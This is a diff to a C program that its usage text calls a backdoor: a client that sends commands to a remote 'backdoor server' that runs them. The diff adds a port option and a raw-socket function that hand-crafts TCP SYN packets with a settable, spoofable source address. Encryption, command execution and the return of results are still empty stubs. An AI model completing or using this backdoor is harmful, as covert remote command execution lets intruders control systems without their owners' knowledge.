@@ -20,10 +20,7 @@
 | Headers
 | ------------------------------------------------------------------------------
 */
-#include <stdlib.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <string.h>
+
 #include "bd.h"
 
 /*
@@ -36,12 +33,14 @@ int main(int argc, char **argv){
 
     /* Parse arguments */
     
-    int opt;
     int is_server = 0;
-    char target_host[128], command[128];
-    target_host[0] = '\0';
-    command[0] = '\0';
-    while((opt = getopt(argc, argv, "hsd:x:")) != -1){
+    struct client_opt c_opt;
+    c_opt.target_host[0] = '\0';
+    c_opt.command[0] = '\0';
+    c_opt.target_port = 0;
+    
+    int opt;
+    while((opt = getopt(argc, argv, "hsd:p:x:")) != -1){
         switch(opt){
             case 'h':
                 usage();
@@ -51,10 +50,13 @@ int main(int argc, char **argv){
                 is_server = 1;
                 break;
             case 'd':
-                strcpy(target_host, optarg);
+                strcpy(c_opt.target_host, optarg);
+                break;
+            case 'p':
+                c_opt.target_port = atoi(optarg);
                 break;
             case 'x':
-                strcpy(command, optarg);
+                strcpy(c_opt.command, optarg);
                 break;
             default:
                 printf("Type -h for usage help.\n");
@@ -68,12 +70,12 @@ int main(int argc, char **argv){
         server();
     }
     else{
-        if(target_host[0] == '\0' || command[0] == '\0'){
+        if(c_opt.target_host[0] == '\0' || c_opt.command[0] == '\0' || c_opt.target_port == 0){
             printf("Type -h for usage help.\n");
             return 1;
         }
         else{
-            client();
+            client(c_opt);
         }
     }
     
@@ -86,15 +88,24 @@ int main(int argc, char **argv){
 | ------------------------------------------------------------------------------
 */
 
-void client(){
+void client(struct client_opt c_opt){
+
+    /* Display options */
 
     printf("Running client...\n");
+    printf("Target Host: %s\n",c_opt.target_host);
+    printf("Target Port: %d\n",c_opt.target_port);
+    printf("Command: %s\n",c_opt.command);
     
     /* Encrypt command */
     
     /* Craft packet with options */
     
+    
+    
     /* Send packet */
+    
+    /* Listen for results and print */
 }
 
 /*
@@ -123,6 +134,95 @@ void server(){
 
 /*
 | ------------------------------------------------------------------------------
+| Send Raw Packet
+| ------------------------------------------------------------------------------
+*/
+
+int send_datagram (struct addr_info *UserAddr) {
+    
+    /* Declare variables */
+    
+    char datagram[PKT_SIZE];
+    struct iphdr *iph = (struct iphdr *) datagram;
+    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
+    struct sockaddr_in sin;
+    pseudo_header psh;
+
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(UserAddr->dport);
+    sin.sin_addr.s_addr = inet_addr(UserAddr->dhost);
+    
+    // Zero out the buffer where the datagram will be stored
+    memset(datagram, 0, PKT_SIZE); 
+ 
+    /* IP header */
+    
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
+    iph->id = htonl(DEFAULT_IP_ID);
+    iph->frag_off = 0;
+    iph->ttl = DEFAULT_TTL;
+    iph->protocol = IPPROTO_TCP;
+    iph->check = 0; // Initialize to zero before calculating checksum
+    iph->saddr = inet_addr(UserAddr->shost);
+    iph->daddr = sin.sin_addr.s_addr;
+ 
+    iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);
+ 
+    /* TCP header */
+    
+    tcph->source = htons (UserAddr->sport);
+    tcph->dest = htons (UserAddr->dport);
+    tcph->seq = 0;
+    tcph->ack_seq = 0;
+    tcph->doff = 5; // Data Offset is set to the TCP header length 
+    tcph->fin = 0;
+    tcph->syn = 1;
+    tcph->rst = 0;
+    tcph->psh = 0;
+    tcph->ack = 0;
+    tcph->urg = 0;
+    tcph->window = htons(WIN_SIZE);
+    tcph->check = 0; // Initialize the checksum to zero (kernel's IP stack will fill in the correct checksum during transmission)
+    tcph->urg_ptr = 0;
+   
+    /* Calculate Checksum */
+    
+    psh.source_address = inet_addr(UserAddr->shost);
+    psh.dest_address = sin.sin_addr.s_addr;
+    psh.placeholder = 0;
+    psh.protocol = IPPROTO_TCP;
+    psh.tcp_length = htons(20);
+ 
+    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
+ 
+    tcph->check = csum((unsigned short*) &psh , sizeof (pseudo_header));
+ 
+    /* Build our own header */
+    
+    {
+        int one = 1;
+        const int *val = &one;
+        if (setsockopt (UserAddr->raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
+            perror ("setsockopt");
+    }
+ 
+    /* Send the packet */
+    
+    if(sendto(UserAddr->raw_socket, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0){
+        perror ("sendto");
+        return -1;
+    }
+    else{ //Data sent successfully
+        printf ("Datagram Sent!\n");
+        return 0;
+    }
+}
+
+/*
+| ------------------------------------------------------------------------------
 | Packet Handler Function
 | ------------------------------------------------------------------------------
 */
@@ -137,6 +237,7 @@ void packet_handler(){
     
     /* All checks successful, run the system command */
     
+    /* Send results back to client */
 }
 
 /*
@@ -149,10 +250,11 @@ void usage(){
     
     printf("\n");
     printf("Usage: ./backdoor [OPTIONS]\n");
-    printf("-------------------------------------------------------------------------\n");
+    printf("---------------------------\n");
     printf("  -h                Display this help.\n");
     printf("CLIENT (default)\n");
     printf("  -d <target_host>  The target host where the backdoor server is running.\n");
+    printf("  -p <target_port>  The target port to send to.\n");
     printf("  -x <command>      The command to run on the target host.\n");
     printf("SERVER\n");
     printf("  -s                Enables server mode. No other options necessary.\n");
